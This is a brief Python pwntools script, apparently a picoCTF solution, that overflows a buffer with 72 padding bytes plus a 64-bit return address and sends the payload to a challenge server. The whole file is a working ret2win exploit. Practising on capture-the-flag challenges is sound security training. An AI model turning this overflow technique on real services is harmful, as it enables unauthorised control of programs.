from pwn import *

offset = 72
#payload = p32(0x00401236)
payload = p64(0x0040123b)
emotional_damage = b'a'*offset + payload 

c = connect("saturn.picoctf.net", 53137)
print(c.recvline())
c.sendline(emotional_damage)
print(c.recv(34	))
